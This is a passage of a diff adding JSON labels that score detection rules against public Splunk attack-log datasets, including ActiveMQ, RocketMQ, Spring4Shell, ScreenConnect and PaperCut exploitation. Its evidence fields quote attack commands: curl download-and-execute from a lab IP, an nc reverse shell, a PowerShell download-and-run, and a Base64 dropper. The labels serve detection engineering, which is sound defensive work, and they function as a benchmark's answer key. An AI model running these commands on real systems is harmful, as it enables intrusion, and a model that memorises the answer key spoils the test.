+     "reason": "The detection reads a web server or reverse-proxy access log (c-ip, cs-method, cs-uri-stem, sc-status); the file holds none, so it cannot see the exploitation. The exploit is a single JNDI-injection request, so even with an access log it would not be the 5+ distinct 401/403 paths per client this correlation counts."
+    },
+    {
+     "detection": "T1190_object_id_enumeration",
+     "label": "telemetry",
+     "evidence": [
+      "Sysmon 3 RID 64848551-64848553: inbound HTTP to java.exe on 8080 followed by JNDI callbacks to 10.0.1.16",
+      "The file holds only Sysmon events; no web server or proxy access log"
+     ],
+     "reason": "The detection reads a web server or reverse-proxy access log (c-ip, cs-method, cs-uri-stem, sc-status); the file holds none, so it cannot see the exploitation. Nothing indicates a numeric object-ID walk."
+    }
+   ]
+  },
+  {
+   "label": "H94",
+   "dataset": "splunk/T1190/papercut/papercutng-app-spawn_windows-sysmon.log",
+   "sha256": "a45f2d037622fb5d11305a5e3e21fe3032c8ffd4bbf115b07293c8317a6bcc21",
+   "summary": "Three Sysmon 1 records on a PaperCut NG server: the PaperCut application server pc-app.exe, running as SYSTEM, spawns calc.exe, 'cmd.exe /c powershell.exe calc.exe' and 'powershell.exe -EncodedCommand' with a short test payload: command execution through the exploited print-management web application.",
+   "labels": [
+    {
+     "detection": "T1059.001_powershell_encoded_command",
+     "label": "attack",
+     "evidence": [
+      "EventRecordID 128237990: Sysmon 1, Image C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe (OriginalFileName PowerShell.EXE), CommandLine 'powershell.exe -EncodedCommand \"<Base64, 32 chars>\"', ParentImage C:\\Program Files\\PaperCut NG\\runtime\\win64\\jre\\bin\\pc-app.exe, User NT AUTHORITY\\SYSTEM",
+      "Context (not encoded, not needed for the label): EventRecordID 128233496 'cmd.exe /c powershell.exe calc.exe'"
+     ],
+     "reason": "PowerShell (by path and OriginalFileName) started with -EncodedCommand and a 32-char Base64 argument by the exploited PaperCut server, which is the documented case; the parent is not a filtered configuration-management tool (SCCM, Intune, RMM), and no documented blind spot applies. The Base64 is wrapped in double quotes, and the README does not list that as an exclusion."
+    },
+    {
+     "detection": "T1190_api_auth_probing",
+     "label": "scope",
+     "evidence": [
+      "EventRecordID 128237990: Sysmon 1, ParentImage C:\\Program Files\\PaperCut NG\\runtime\\win64\\jre\\bin\\pc-app.exe (SYSTEM) -> powershell.exe -EncodedCommand \"<Base64, 32 chars>\"",
+      "EventRecordID 128233496: Sysmon 1, pc-app.exe -> cmd.exe, CommandLine 'cmd.exe /c powershell.exe calc.exe'",
+      "EventRecordID 128232314: Sysmon 1, pc-app.exe -> calc.exe, CommandLine 'calc.exe'",
+      "No web-server or reverse-proxy access log records in the file (no c-ip / cs-uri-stem / sc-status data)"
+     ],
+     "reason": "Exploitation of the PaperCut NG server (T1190) is visible only as host-side outcome (pc-app.exe spawning calc.exe, cmd.exe and an encoded PowerShell command); the detection's scope is a web access log in which one client gets 401/403 on >=5 distinct paths in a 5-minute window, and nothing here shows rejected-path probing"
+    },
+    {
+     "detection": "T1190_object_id_enumeration",
+     "label": "scope",
+     "evidence": [
+      "EventRecordID 128237990: Sysmon 1, ParentImage C:\\Program Files\\PaperCut NG\\runtime\\win64\\jre\\bin\\pc-app.exe (SYSTEM) -> powershell.exe -EncodedCommand \"<Base64, 32 chars>\"",
+      "EventRecordID 128233496: Sysmon 1, pc-app.exe -> cmd.exe, CommandLine 'cmd.exe /c powershell.exe calc.exe'",
+      "EventRecordID 128232314: Sysmon 1, pc-app.exe -> calc.exe, CommandLine 'calc.exe'",
+      "No web-server or reverse-proxy access log records in the file (no c-ip / cs-uri-stem / sc-status data)"
+     ],
+     "reason": "Exploitation of the PaperCut NG server (T1190) is visible only as host-side outcome (pc-app.exe spawning calc.exe, cmd.exe and an encoded PowerShell command); the detection's scope is one client sending GETs for >=3 distinct numeric basket/user/account/profile/wallet IDs per minute in a web access log, and nothing here shows object-ID walking"
+    }
+   ]
+  },
+  {
+   "label": "H95",
+   "dataset": "splunk/T1190/proxyshell/msexchangehmworker_windows-sysmon.log",
+   "sha256": "bd8380ed6ce986130fa86a6ee291d0daf8c0b50579e1a45d89b8d825c9c04846",
+   "summary": "Eight Sysmon 1 records on Exchange server win-dc-exch01: the Exchange Health Manager worker (MSExchangeHMWorker.exe -workerListening, SYSTEM) repeatedly runs 'netsh interface tcp show global' (21:14, 21:34, 21:39) and 'nslookup 127.0.0.1 127.0.0.1' (21:18, 21:43), plus 'cmd /c nltest /dsgetdc:', 'cmd /c nltest /dclist:' and an LDAP SRV nslookup. These are routine Exchange health probes, not a ProxyShell exploitation step. No event is in any detection's scope (no WinRM host parent, no encoded PowerShell, no schtasks or rundll32), so no detection applies.",
+   "labels": []
+  },
+  {
+   "label": "H96",
+   "dataset": "splunk/T1190/pswa/4648_4624_pswa_pool.log",
+   "sha256": "19789140997fc63ed2dc67232b73baeb62b1c6866bee825393c1fae9c6819e03",
+   "summary": "Security 4648 x14 and 4624 x2 on the PowerShell Web Access (PSWA) gateway ar-win-2 over about 10 minutes: the IIS pool identity IIS APPPOOL\\pswa_pool (w3wp.exe) logs on with explicit administrator credentials to localhost (4624 type 3, Advapi, MSV1_0, AR-WIN-2\\Administrator) and to WinRM on ar-win-dc (TargetInfo HTTP/ar-win-dc), i.e. browser-driven PowerShell remoting sessions as administrator. The file holds no failures, process events or web logs.",
+   "labels": [
+    {
+     "detection": "T1021.006_wsmprovhost_suspicious_child",
+     "label": "scope",
+     "evidence": [
+      "EventRecordID 442870 (first of 12, last 442956): 4648, SubjectUserName pswa_pool, ProcessName C:\\Windows\\System32\\inetsrv\\w3wp.exe, TargetUserName administrator@ATTACKRANGE.LOCAL, TargetServerName ar-win-dc, TargetInfo HTTP/ar-win-dc",
+      "EventRecordIDs 442866/442867 and 442924/442925: 4648 to localhost, then 4624 LogonType 3, LogonProcessName Advapi, AuthenticationPackage MSV1_0, TargetUser AR-WIN-2\\Administrator, ProcessName w3wp.exe",
+      "No Sysmon 1 or Security 4688 in the file, so no process started by wsmprovhost.exe or winrshost.exe is recorded"
+     ],
+     "reason": "PSWA runs the session through PowerShell remoting (WinRM: HTTP/<host> as the target), but only the logons are recorded, and the README puts those outside the rule ('A WinRM logon alone ... is everyday administration, so the rule keys on what the session started, not on the connection'). No cmd/encoded PowerShell/proxy child of a WinRM host is shown."
+    }
+   ]
+  },
+  {
+   "label": "H97",
+   "dataset": "splunk/T1190/pswa/4648_pswa_pool.log",
+   "sha256": "1d5830749f11100e4d5737526e535f33f78a387c210fdd3b72d04c8b0d068466",
+   "summary": "Security 4648 x47 from 2024-09-05 to 2024-09-09 on the PSWA gateway ar-win-2: IIS APPPOOL\\pswa_pool (w3wp.exe) uses explicit administrator credentials for localhost, ar-win-2 (HTTP/ar-win-2.attackrange.local) and ar-win-dc (HTTP/ar-win-dc): repeated PowerShell Web Access remoting sessions as administrator. Only explicit-credential logon events are present.",
+   "labels": [
+    {
+     "detection": "T1021.006_wsmprovhost_suspicious_child",
+     "label": "scope",
+     "evidence": [
+      "EventRecordID 240398 (first of 13, last 267939): 4648, SubjectUserName pswa_pool, ProcessName C:\\Windows\\System32\\inetsrv\\w3wp.exe, TargetUserName administrator@ATTACKRANGE.LOCAL, TargetServerName ar-win-dc, TargetInfo HTTP/ar-win-dc",
+      "EventRecordID 230408 (first of 24, last 231138): 4648, same subject, TargetServerName ar-win-2.attackrange.local, TargetInfo HTTP/ar-win-2.attackrange.local",
+      "EventRecordID 230395 (first of 5, last 267795): 4648, TargetUser AR-WIN-2\\Administrator, TargetServerName localhost",
+      "No Sysmon 1 or Security 4688 in the file, so no process started by wsmprovhost.exe or winrshost.exe is recorded"
+     ],
+     "reason": "PSWA remoting sessions (WinRM, TargetInfo HTTP/<host>) are shown only through the gateway's explicit-credential logons, which the README puts outside the rule ('A WinRM logon alone ... the rule keys on what the session started'). No cmd/encoded PowerShell/proxy child of a WinRM host is shown."
+    }
+   ]
+  },
+  {
+   "label": "H98",
+   "dataset": "splunk/T1190/sap/windows-sysmon.log",
+   "sha256": "f8e0bfd644360e21f49b528561e48d5482fd85f9407dab77cf13bb2d5ea57387",
+   "summary": "One Sysmon 1 record: MSBuild.exe (C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319) is started through 'Cmd.exe /c' as WIN-HOST-MHAAG-\\Administrator (CurrentDirectory C:\\Windows\\Temp) to build a project file staged at c:\\programdata\\1.txt, with -p: property arguments (a second ProgramData file and a 64-hex value, redacted). This is MSBuild proxy execution (T1127.001) of a staged payload. The SAP application process is not in the record (the parent is cmd.exe), so no exploitation step is visible. None of the 18 detections covers MSBuild, so none applies. The record is an edited copy of the H89 record (same EventRecordID 13208447, GUIDs and timestamp).",
+   "labels": []
+  },
+  {
+   "label": "H99",
+   "dataset": "splunk/T1190/screenconnect/4663_connectwise_aspx_app_extensions.log",
+   "sha256": "580f70175cb41dc8ef6a6d6b00a1472bd36d8b8f80e0bf85c6e225622c25ec3a",
+   "summary": "Security 4663 x8 (file object access) on ScreenConnect server ar-win-2: ScreenConnect.Service.exe (subject AR-WIN-2\\Administrator) writes 'evilapp - Copy.aspx' and 'evilapp - Copy (2).aspx' directly into ScreenConnect\\App_Extensions. This is the web-shell drop that follows ScreenConnect exploitation (extension path traversal).",
+   "labels": [
+    {
+     "detection": "T1190_api_auth_probing",
+     "label": "scope",
+     "evidence": [
+      "EventRecordIDs 10525827-10525831: 4663, ProcessName C:\\Program Files (x86)\\ScreenConnect\\Bin\\ScreenConnect.Service.exe, ObjectName ...\\ScreenConnect\\App_Extensions\\evilapp - Copy.aspx, AccessMask 0x2/0x4/0x80/0x100 (WriteData, AppendData, attributes)",
+      "EventRecordIDs 10525865-10525869: 4663, same process, ObjectName ...\\App_Extensions\\evilapp - Copy (2).aspx, same masks",
+      "No web-server or reverse-proxy access log records in the file (no c-ip / cs-uri-stem / sc-status data)"
+     ],
+     "reason": "Exploitation of the ScreenConnect server (T1190) is visible only as host-side outcome (ScreenConnect.Service.exe writing .aspx files into App_Extensions, recorded as 4663); the detection's scope is a web access log in which one client gets 401/403 on >=5 distinct paths in a 5-minute window, and nothing here shows rejected-path probing"
+    },
+    {
+     "detection": "T1190_object_id_enumeration",
+     "label": "scope",
+     "evidence": [
+      "EventRecordIDs 10525827-10525831: 4663, ProcessName C:\\Program Files (x86)\\ScreenConnect\\Bin\\ScreenConnect.Service.exe, ObjectName ...\\ScreenConnect\\App_Extensions\\evilapp - Copy.aspx, AccessMask 0x2/0x4/0x80/0x100 (WriteData, AppendData, attributes)",
+      "EventRecordIDs 10525865-10525869: 4663, same process, ObjectName ...\\App_Extensions\\evilapp - Copy (2).aspx, same masks",
+      "No web-server or reverse-proxy access log records in the file (no c-ip / cs-uri-stem / sc-status data)"
+     ],
+     "reason": "Exploitation of the ScreenConnect server (T1190) is visible only as host-side outcome (ScreenConnect.Service.exe writing .aspx files into App_Extensions, recorded as 4663); the detection's scope is one client sending GETs for >=3 distinct numeric basket/user/account/profile/wallet IDs per minute in a web access log, and nothing here shows object-ID walking"
+    }
+   ]
+  },
+  {
+   "label": "H100",
+   "dataset": "splunk/T1190/screenconnect/sysmon_app_extensions.log",
+   "sha256": "29ec567a1492996969c3fa4afe3251d460edbe3173849f2f7ce203887ab3831d",
+   "summary": "Two Sysmon 11 records on ar-win-2: ScreenConnect.Service.exe creates 'evilapp - Copy.aspx' and 'evilapp - Copy (2).aspx' in ScreenConnect\\App_Extensions. This is the same web-shell drop through ScreenConnect exploitation as H99, seen as file creation.",
+   "labels": [
+    {
+     "detection": "T1190_api_auth_probing",
+     "label": "scope",
+     "evidence": [
+      "EventRecordID 19347491: Sysmon 11, Image C:\\Program Files (x86)\\ScreenConnect\\Bin\\ScreenConnect.Service.exe, TargetFilename ...\\ScreenConnect\\App_Extensions\\evilapp - Copy.aspx",
+      "EventRecordID 19347613: Sysmon 11, same process, TargetFilename ...\\App_Extensions\\evilapp - Copy (2).aspx",
+      "No web-server or reverse-proxy access log records in the file (no c-ip / cs-uri-stem / sc-status data)"
+     ],
+     "reason": "Exploitation of the ScreenConnect server (T1190) is visible only as host-side outcome (ScreenConnect.Service.exe creating .aspx files in App_Extensions, recorded as Sysmon 11); the detection's scope is a web access log in which one client gets 401/403 on >=5 distinct paths in a 5-minute window, and nothing here shows rejected-path probing"
+    },
+    {
+     "detection": "T1190_object_id_enumeration",
+     "label": "scope",
+     "evidence": [
+      "EventRecordID 19347491: Sysmon 11, Image C:\\Program Files (x86)\\ScreenConnect\\Bin\\ScreenConnect.Service.exe, TargetFilename ...\\ScreenConnect\\App_Extensions\\evilapp - Copy.aspx",
+      "EventRecordID 19347613: Sysmon 11, same process, TargetFilename ...\\App_Extensions\\evilapp - Copy (2).aspx",
+      "No web-server or reverse-proxy access log records in the file (no c-ip / cs-uri-stem / sc-status data)"
+     ],
+     "reason": "Exploitation of the ScreenConnect server (T1190) is visible only as host-side outcome (ScreenConnect.Service.exe creating .aspx files in App_Extensions, recorded as Sysmon 11); the detection's scope is one client sending GETs for >=3 distinct numeric basket/user/account/profile/wallet IDs per minute in a web access log, and nothing here shows object-ID walking"
+    }
+   ]
+  },
+  {
+   "label": "H101",
+   "dataset": "splunk/T1190/snapattack/snapattack.log",
+   "sha256": "73f63a6768163a114ba748cd42f909d0efa56a663a408b2e0889c21cc3319774",
+   "summary": "SnapAttack compilation of 18 records (11 distinct, 7 of them repeated) from many exploited servers: ActiveMQ java.exe -> cmd /c PowerShell Invoke-WebRequest download and Start-Process; MOVEit w3wp.exe -> csc.exe; Idera cdpserver.exe -> whoami to Users\\Public; OFBiz java.exe -> calc; ScreenConnect.Service.exe -> cmd /c whoami plus an .ashx in App_Extensions; cmd /c whoami under inetsrv on MXS01; splunkd writing shell.xsl; curl writing a reverse-shell .ps1 into the Confluence folder; a TeamCity java payload class run from C:\\Windows\\TEMP (4688); DC lsass.exe resolving an SRV record in an external lab domain (Sysmon 22).",
+   "labels": [
+    {
+     "detection": "T1059.001_powershell_encoded_command",
+     "label": "scope",
+     "evidence": [
+      "EventRecordID 18061 (ordinal 1, duplicated at 12): Sysmon 1, Image C:\\Windows\\System32\\cmd.exe, ParentImage C:\\Program Files\\Java\\jdk-17\\bin\\java.exe, CommandLine 'cmd /c \"powershell Invoke-WebRequest \"http://192.168.196.163/test.exe\" -OutFile \"test.exe\"; Start-Pr...'",
+      "No PowerShell process record and no -e/-ec/-en* Base64 argument anywhere in the file"
+     ],
+     "reason": "The attack runs PowerShell (download and Start-Process) with a plain, unobfuscated command line; the detection's scope is only a dash-like -e/-ec/-en* switch followed by a 16+ char Base64 blob, and the powershell.exe process record itself is absent (only its cmd.exe parent)."
+    },
+    {
+     "detection": "T1190_api_auth_probing",
+     "label": "scope",
+     "evidence": [
+      "EventRecordID 18061 (ordinal 1, duplicated at 12): Sysmon 1, ParentImage C:\\Program Files\\Java\\jdk-17\\bin\\java.exe (ActiveMQ) -> cmd.exe 'cmd /c \"powershell Invoke-WebRequest \"http://192.168.196.163/test.exe\" -OutFile \"test.exe\"; Start-Pr...'",
+      "EventRecordID 11921 (ordinals 2/13): Sysmon 1, w3wp.exe -ap \"moveitdmz pool\" -> csc.exe, User moveitsvc",
+      "EventRecordID 19520 (ordinals 3/14): Sysmon 1, Idera Server Backup cdpserver.exe (SYSTEM) -> 'cmd.exe /c \"whoami > c:\\Users\\Public\\whoami.txt\"'",
+      "EventRecordID 34820 (ordinals 10/18): Sysmon 1, ScreenConnect.Service.exe (SYSTEM) -> '\"cmd.exe\" /c whoami'; EventRecordID 34757: Sysmon 11, ScreenConnect.Service.exe creates ...\\App_Extensions\\ylzfxmmf.ashx",
+      "EventRecordID 1254: Sysmon 1, OFBiz java.exe -> calc; EventRecordID 2981: Sysmon 11, splunkd.exe creates ...\\dispatch\\...\\shell.xsl; EventRecordID 6126: Sysmon 11, curl.exe (NETWORK SERVICE) creates C:\\Program Files\\Atlassian\\Confluence\\mini-reverse.ps1",
+      "EventRecordID 103244: 4688, TeamCity java.exe -> 'c:\\TeamCity\\jre\\bin\\java.exe -classpath C:\\Windows\\TEMP\\~spawn54130305529377823...'",
+      "No web-server or reverse-proxy access log records in the file (no c-ip / cs-uri-stem / sc-status data)"
+     ],
+     "reason": "Exploitation of ActiveMQ, MOVEit, Idera, OFBiz, ScreenConnect, TeamCity, Splunk and Confluence servers (T1190) is visible only as host-side outcome (server processes spawning shells or payloads and writing web shells); the detection's scope is a web access log in which one client gets 401/403 on >=5 distinct paths in a 5-minute window, and nothing here shows rejected-path probing"
+    },
+    {
+     "detection": "T1190_object_id_enumeration",
+     "label": "scope",
+     "evidence": [
+      "EventRecordID 18061 (ordinal 1, duplicated at 12): Sysmon 1, ParentImage C:\\Program Files\\Java\\jdk-17\\bin\\java.exe (ActiveMQ) -> cmd.exe 'cmd /c \"powershell Invoke-WebRequest \"http://192.168.196.163/test.exe\" -OutFile \"test.exe\"; Start-Pr...'",
+      "EventRecordID 11921 (ordinals 2/13): Sysmon 1, w3wp.exe -ap \"moveitdmz pool\" -> csc.exe, User moveitsvc",
+      "EventRecordID 19520 (ordinals 3/14): Sysmon 1, Idera Server Backup cdpserver.exe (SYSTEM) -> 'cmd.exe /c \"whoami > c:\\Users\\Public\\whoami.txt\"'",
+      "EventRecordID 34820 (ordinals 10/18): Sysmon 1, ScreenConnect.Service.exe (SYSTEM) -> '\"cmd.exe\" /c whoami'; EventRecordID 34757: Sysmon 11, ScreenConnect.Service.exe creates ...\\App_Extensions\\ylzfxmmf.ashx",
+      "EventRecordID 1254: Sysmon 1, OFBiz java.exe -> calc; EventRecordID 2981: Sysmon 11, splunkd.exe creates ...\\dispatch\\...\\shell.xsl; EventRecordID 6126: Sysmon 11, curl.exe (NETWORK SERVICE) creates C:\\Program Files\\Atlassian\\Confluence\\mini-reverse.ps1",
+      "EventRecordID 103244: 4688, TeamCity java.exe -> 'c:\\TeamCity\\jre\\bin\\java.exe -classpath C:\\Windows\\TEMP\\~spawn54130305529377823...'",
+      "No web-server or reverse-proxy access log records in the file (no c-ip / cs-uri-stem / sc-status data)"
+     ],
+     "reason": "Exploitation of ActiveMQ, MOVEit, Idera, OFBiz, ScreenConnect, TeamCity, Splunk and Confluence servers (T1190) is visible only as host-side outcome (server processes spawning shells or payloads and writing web shells); the detection's scope is one client sending GETs for >=3 distinct numeric basket/user/account/profile/wallet IDs per minute in a web access log, and nothing here shows object-ID walking"
+    }
+   ]
+  },
+  {
+   "label": "H102",
+   "dataset": "splunk/T1190/snapattack/snapattack_linux.log",
+   "sha256": "5a0b799e30cf4d85683ec737b7815309977e13a5481693005b7b628311bd409d",
+   "summary": "Linux Sysmon, 4 records stitched from separate SnapAttack captures (hosts ubuntu and ip-10-0-254-161, 2022-2023):\n- ActiveMQ 5.18.0 exploitation (CVE-2023-46604 style): root runs `sh -c curl -s -o test.elf http://192.168.196.163/test.elf; chmod +x ./test.elf; ./test.elf` in the ActiveMQ bin directory;\n- RocketMQ 5.1.0 exploitation (CVE-2023-33246 style): `sh -c $@|sh . echo nc 192.168.196.133 4444 -e /bin/bash;...`;\n- splunkd writes shell.xsl into a search dispatch directory (CVE-2023-46214 style XSLT upload);\n- a bash runs under the postgres account in the PostgreSQL data directory.",
+   "labels": [
+    {
+     "detection": "T1059.004_linux_suspicious_shell_execution",
+     "label": "scope",
+     "evidence": [
+      "EventRecordID 16694 (#1): Linux Sysmon 1, Image /usr/bin/dash, User root, CurrentDirectory /opt/apache-activemq-5.18.0/bin/linux-x86-64, CommandLine `sh -c curl -s -o test.elf http://192.168.196.163/test.elf; chmod +x ./test.elf; ./test.elf`",
+      "EventRecordID 2167 (#2): Image /usr/bin/dash, User root, CommandLine `sh -c $@|sh . echo nc 192.168.196.133 4444 -e /bin/bash;/bin/startfsrv.sh -c /home/ubuntu/Downlo...` (166 chars)",
+      "EventRecordID 1651 (#4): Image /usr/bin/bash, User postgres, CommandLine `bash`, CurrentDirectory /var/lib/postgresql/12/main",
+      "No record contains base64, /tmp/, /var/tmp/ or /dev/shm/"
+     ],
+     "reason": "Exploited services run Unix shell commands (T1059.004), but none is in the documented scope:\n- no Base64 is decoded; RocketMQ pipes plain `echo` output into sh (susp_b64_pipe needs a Base64 decode piped into the shell);\n- the downloaded ELF is written to and run from the ActiveMQ working directory, not /tmp, /var/tmp or /dev/shm (the README lists other writable directories as a coverage gap), and its own process start is not recorded;\n- each shell's first argument is -c or nothing, not a temp-directory script."
+    },
+    {
+     "detection": "T1190_api_auth_probing",
+     "label": "telemetry",
+     "evidence": [
+      "EventRecordID 529 (#3): Linux Sysmon 11, /opt/splunk/bin/splunkd creates /opt/splunk/var/run/splunk/dispatch/1702318424.15/shell.xsl",
+      "EventRecordID 16694 and 2167: post-exploitation shells of ActiveMQ and RocketMQ",
+      "The file holds only Linux-Sysmon/Operational events (EIDs 1, 11); no web server or proxy access log"
+     ],
+     "reason": "The detection reads a web server or reverse-proxy access log (c-ip, cs-method, cs-uri-stem, sc-status); the file holds none, so it cannot see the exploitation. ActiveMQ and RocketMQ are exploited over their broker protocols, which an HTTP access log would not record. The Splunk XSLT upload is a handful of authenticated requests, not 401/403 probing across 5+ paths."
+    },
+    {
+     "detection": "T1190_object_id_enumeration",
+     "label": "telemetry",
+     "evidence": [
+      "EventRecordID 529 (#3), 16694 (#1), 2167 (#2): exploitation outcomes recorded through Sysmon only",
+      "The file holds only Linux-Sysmon/Operational events; no web server or proxy access log"
+     ],
+     "reason": "The detection reads a web server or reverse-proxy access log (c-ip, cs-method, cs-uri-stem, sc-status); the file holds none, so it cannot see the exploitation. Nothing indicates a numeric object-ID walk."
+    }
+   ]
+  },
+  {
+   "label": "H103",
+   "dataset": "splunk/T1190/spring4shell/java_write_jsp-linux-sysmon.log",
+   "sha256": "0d4a7a7cd53cbac2cc2b552921d9f2aad9bea9fcc3a1381b81c4d5dff3be3264",
+   "summary": "Linux Sysmon (151 records, host sysmonlinux-jhernandez-17500-4610 = 10.0.1.20, 2022-04-05/06), filtered to Java-related activity. Two exploits are recorded:\n- Spring4Shell: Tomcat 9 (java, user tomcat) accepts inbound connections on 8080, writes webshells webapps/ROOT/shell.jsp and shell_.jsp (EID 11) and compiles them; root later deletes them with rm.\n- Spring Cloud Function (CVE-2022-22963 style): `java -jar function-sample-pojo-2.0.0.RELEASE.jar --server.port=9000` (root) spawns a Metasploit-style `/bin/sh -c` stager. It writes Base64 to /tmp/hbMTK.b64, decodes it into /tmp/mBZXM, runs chmod +x, executes the file and deletes both files. The dropped binary's own process start is not in the file.",
+   "labels": [
+    {
+     "detection": "T1059.004_linux_suspicious_shell_execution",
+     "label": "scope",
+     "evidence": [
+      "EventRecordID 3373023 (#25): Linux Sysmon 1, Image /bin/dash, User root, ParentImage /usr/lib/jvm/java-11-openjdk-amd64/bin/java (`java -jar ./target/function-sample-pojo-2.0.0.RELEASE.jar --server.port=9000`, RID 3370467)",
+      "Same record, CommandLine (834 chars): `/bin/sh -c echo -n <Base64, 336 chars>>>'/tmp/hbMTK.b64' ; ((which base64 >&2 && base64 -d -) ||...`",
+      "Structure of that command: decoder fallbacks (base64 -d, base64 --decode, openssl enc -d, python, perl), then ` 2> /dev/null > '/tmp/mBZXM' < '/tmp/hbMTK.b64' ; chmod +x '/tmp/mBZXM' ; '/tmp/mBZXM' ; rm -f ...`; the command contains no single `|`",
+      "No process-creation, network or file record for /tmp/mBZXM or /tmp/hbMTK.b64 (all EID 3/5/11 are java; EID 23 are java or rm)"
+     ],
+     "reason": "A web-app RCE running a Base64 dropper through sh -c is T1059.004 behaviour, but this record is outside the documented scope:\n- the decoded output is redirected into a file, not piped into sh/bash/dash/zsh/ksh (susp_b64_pipe);\n- Image /bin/dash is not under a temp directory (susp_tmp_binary);\n- the shell's first argument is -c, not a temp-directory script (tmp_script_shell/tmp_script_path).\nThe next step, starting /tmp/mBZXM, would match susp_tmp_binary, but its process creation is not in this Java-filtered export."
+    },
+    {
+     "detection": "T1190_api_auth_probing",
+     "label": "telemetry",
+     "evidence": [
+      "EventRecordID 376726 / 376864 (#136/#135): Linux Sysmon 11, java (user tomcat) creates .../webapps/ROOT/shell_.jsp and .../ROOT/shell.jsp (2022-04-05 16:10:24 / 16:10:28)",
+      "Linux Sysmon 3 RID 376709 (#137): inbound 73.245.172.254:42181 -> 10.0.1.20:8080 at 16:10:24 (ffff:49f5:acfe -> ffff:a00:114)",
+      "Tomcat's localhost_access_log_.txt is only seen being created (Sysmon 11 RID 317025); its content is not in the file. Only Linux-Sysmon/Operational events are present"
+     ],
+     "reason": "The detection reads a web server or reverse-proxy access log (c-ip, cs-method, cs-uri-stem, sc-status); the file holds none, so it cannot see the exploitation. Spring4Shell and the Spring Cloud Function SpEL injection are single crafted requests, so even with an access log they would not be 401/403 rejections on 5+ distinct paths per client."
+    },
+    {
+     "detection": "T1190_object_id_enumeration",
+     "label": "telemetry",
+     "evidence": [
+      "EventRecordID 376726 / 376864: webshell JSPs written by Tomcat; Sysmon 3 shows inbound connections to 10.0.1.20:8080",
+      "Only Linux-Sysmon/Operational events are present; no web server or proxy access log"
+     ],
+     "reason": "The detection reads a web server or reverse-proxy access log (c-ip, cs-method, cs-uri-stem, sc-status); the file holds none, so it cannot see the exploitation. Nothing indicates a numeric object-ID walk."
+    }
+   ]
+  },
+  {
+   "label": "H104",
+   "dataset": "splunk/T1053.005/atomic_red_team/attack_data.json",
+   "sha256": "75f0cca49b74873e922ec27b3256a0b5d1ab3113eb70c91ab5df2c5ad402cb1e",
+   "summary": "Splunk Attack Range domain controller (win-dc-8400769.attackrange.local), about 15 minutes on 2020-08-01: Ansible over WinRM installs Invoke-AtomicRedTeam and runs Atomic T1053.005 tests 1-4 (schtasks /create OnLogon and OnStartup tasks with a 'cmd.exe /c calc.exe' action, a one-time local task, a localhost task with explicit credentials, and a New-ScheduledTaskAction/Register-ScheduledTask PowerShell task), then runs the cleanup. The rest is Splunk forwarder activity, a Caldera agent started at boot, and the DC's own Kerberos/logon traffic: LSASS is opened only with masks lacking PROCESS_VM_READ, plus one PowerShell 0x1410 access with a System.ni.dll frame (documented filter); all 4769 are AES tickets for the DC account/krbtgt from ::1; the only 7045 is Splunk Stream's npf.sys in Program Files; no Run-key writes.",
+   "labels": [
+    {
+     "detection": "T1053.005_schtasks_suspicious_creation",
+     "label": "attack",
+     "evidence": [
+      "RecordNumber 5688: Sysmon 1, Image C:\\Windows\\System32\\schtasks.exe (OriginalFileName sctasks.exe), CommandLine 'schtasks  /create /tn \"T1053_005_OnLogon\" /sc onlogon /tr \"cmd.exe /c calc.exe\"', parent cmd.exe <- powershell.exe running Invoke-AtomicTest",
+      "RecordNumber 5705: Sysmon 1, schtasks.exe, CommandLine 'schtasks  /create /tn \"T1053_005_OnStartup\" /sc onstart /ru system /tr \"cmd.exe /c calc.exe\"'",
+      "Not matching on their own: RecordNumber 5736 'SCHTASKS  /Create /SC ONCE /TN spawn /TR C:\\windows\\system32\\cmd.exe /ST 20:10'; RecordNumber 5767 'SCHTASKS  /Create /S localhost /RU ATTACKRANGE\\Administrator /RP <redacted> /TN \"Atomic task\" /TR \"C:\\windows\\system32\\cmd.exe\" ...'"
+     ],
+     "reason": "schtasks.exe /create whose task action runs 'cmd /c' (susp_action): Atomic T1053.005 test 1. Tests 2 and 3 fall outside the documented scope: a bare cmd.exe action (no /c, no writable path or URL), and remote creation with /S localhost but /RU Administrator, while susp_system_remote needs /ru SYSTEM. No documented filter (Click-to-Run) applies."
+    },
+    {
+     "detection": "T1053.005_powershell_scheduled_task_creation",
+     "label": "attack",
+     "evidence": [
+      "RecordNumber 5791: Sysmon 1, Image C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, parent powershell.exe running Invoke-AtomicTest, CommandLine '\"...\\powershell.exe\" &amp; {$Action = New-ScheduledTaskAction -Execute \\\"\"calc.exe\\\"\" $Trigger = ...' (447 chars), which also holds 'Register-ScheduledTask AtomicTask -InputObject $object'"
+     ],
+     "reason": "Register-ScheduledTask on the process command line combined with an inline New-ScheduledTaskAction -Execute (susp_action): Atomic T1053.005 test 4. The cleanup at RecordNumber 6124 (Unregister-ScheduledTask, no suspicious indicator) registers nothing."
+    },
+    {
+     "detection": "T1059.001_powershell_encoded_command",
+     "label": "other",
+     "evidence": [
+      "RecordNumber 4718 (also 4966, 5315, 5515, 5861, 9239): Sysmon 1, powershell.exe 'PowerShell  -NoProfile -NonInteractive -ExecutionPolicy Unrestricted -EncodedCommand <base64 payload, 2700 chars>', parent cmd.exe <- winrshost.exe (Ansible WinRM bootstrap)",
+      "RecordNumber 4738 (also 5000, 5335, 5535, 5881, 9259): Sysmon 1, powershell.exe '-EncodedCommand <base64 payload, 928 chars>' from that bootstrap; decodes to Ansible's exec_wrapper",
+      "RecordNumber 5601: Sysmon 1, powershell.exe '\"powershell.exe\" -noninteractive -encodedcommand <base64 payload, 1020 chars>' (Ansible win_shell form; decodes to Import-Module Invoke-AtomicRedTeam / Invoke-AtomicTest T1053.005), the parent of the test processes",
+      "RecordNumbers 4830, 5066, 5401, 5947: same win_shell form, decoding to Install-PackageProvider, Install-AtomicRedTeam, Invoke-AtomicTest -GetPrereqs and -Cleanup; RecordNumbers 2650, 2712: '-EncodedCommand' <168 / 16 chars> (Get-WmiObject, whoami)"
+     ],
+     "reason": "In scope (dash-prefixed -EncodedCommand/-encodedcommand with a 16+ character Base64 blob, no SCCM-style parent filter), so an alert is expected, but every encoded command line is the Ansible WinRM/win_shell transport or the ART install, prerequisite and cleanup steps. The T1053.005 tests themselves run with plain command lines."
+    },
+    {
+     "detection": "T1021.006_wsmprovhost_suspicious_child",
+     "label": "other",
+     "evidence": [
